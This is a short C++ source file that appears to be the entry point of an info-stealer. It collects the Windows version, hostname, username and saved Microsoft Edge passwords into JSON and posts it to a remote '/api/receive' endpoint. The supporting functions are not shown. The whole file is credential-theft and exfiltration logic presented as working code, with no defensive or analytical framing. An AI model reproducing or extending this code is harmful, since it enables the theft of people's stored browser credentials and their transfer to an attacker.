#include <iostream>
#include "Enumerator.h"
#include "netwin.h"

int main()
{
	json Data;
	Data["windows_version"] = GetWinVersion();
	Data["hostname"] = GetHostName();
	Data["username"] = GetUName();
	Data["edge_passwords"] = EdgePasswords();

	std::string jsonData = Data.dump();
	std::cout << jsonData << std::endl;
	const std::wstring uri = L"/api/receive";
	Post(jsonData, uri);

	return 0;	
	
}
